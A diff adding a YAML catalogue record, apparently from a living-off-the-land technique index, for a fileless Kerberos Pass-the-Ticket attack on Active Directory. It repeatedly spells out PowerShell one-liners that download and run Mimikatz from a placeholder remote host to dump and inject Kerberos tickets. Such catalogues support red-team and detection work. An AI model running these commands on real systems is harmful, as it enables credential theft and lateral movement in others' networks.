@@ -1,0 +1,91 @@
+id: lolad/UGFzcy10aGUtVGlja2V0IEF0dGFjayAoRmlsZWxlc3Mp/RHVtcCBLZXJiZXJvcyB0aWNrZXRzIGluIG1lbW9yeTogSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc2Vydmlkb3JfcmVtb3RvL21pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUNvbW1hbmQgJ3Nla3VybHNhOjp0aWNrZXRzJyBVc2UgYSBzcGVjaWZpYyBLZXJiZXJvcyB0aWNrZXQ6IElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL3NlcnZpZG9yX3JlbW90by9taW1pa2F0ei5wczEnKTsgSW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICdrZXJiZXJvczo6cHR0ICc/UG93ZXJTaGVsbCAoRmlsZWxlc3Mp
+type: technique
+platform: active-directory
+name: Pass-the-Ticket Attack (Fileless)
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+  last_synced: '2026-11-13'
+commands:
+- template: 'Dump Kerberos tickets in memory: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+    Invoke-Mimikatz -Command ''sekurlsa::tickets'' Use a specific Kerberos ticket: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+    Invoke-Mimikatz -Command ''kerberos::ptt '''
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell (fileless)
+source_data:
+  LOLAD:
+    raw:
+      name: Pass-the-Ticket Attack (Fileless)
+      command: 'Dump Kerberos tickets in memory: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+        Invoke-Mimikatz -Command ''sekurlsa::tickets'' Use a specific Kerberos ticket: IEX (New-Object
+        Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1''); Invoke-Mimikatz -Command
+        ''kerberos::ptt '''
+      type: PowerShell (Fileless)
+      reference: Mimikatz Cheat Sheet - Pass-the-Ticket
+      physical_rows:
+      - input_ref: index.html#row=126
+        row_utf8: "<tr>\r\n\t\t    <td>Pass-the-Ticket Attack (Fileless)</td>\r\n\t\t    <td>\r\n\t\t\
+          \        Dump Kerberos tickets in memory:\r\n\t\t        <br><code>IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1');\
+          \ Invoke-Mimikatz -Command 'sekurlsa::tickets'</code>\r\n\t\t        <br>Use a specific Kerberos\
+          \ ticket:\r\n\t\t        <br><code>IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1');\
+          \ Invoke-Mimikatz -Command 'kerberos::ptt <ticket.kirbi>'</code>\r\n\t\t    </td>\r\n\t\t  \
+          \  <td>PowerShell (Fileless)</td>\r\n\t\t    <td><a href=\"https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#pass-the-ticket\"\
+          \ target=\"_blank\">Mimikatz Cheat Sheet - Pass-the-Ticket</a></td>\r\n\t\t</tr>"
+        row_sha256: sha256:fe9fd3f163e08e4aaa308471e7726a42c2220859c0940f9d95c802d3b33b6c3e
+        cells:
+        - Pass-the-Ticket Attack (Fileless)
+        - 'Dump Kerberos tickets in memory: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+          Invoke-Mimikatz -Command ''sekurlsa::tickets'' Use a specific Kerberos ticket: IEX (New-Object
+          Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1''); Invoke-Mimikatz -Command
+          ''kerberos::ptt '''
+        - PowerShell (Fileless)
+        - Mimikatz Cheat Sheet - Pass-the-Ticket
+      physical_occurrence_count: 1
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLAD: sha256:bd759cb8a0c7ffa882d8ee3a4782fafa8a6c97484b713b29ac708bd2e132e621
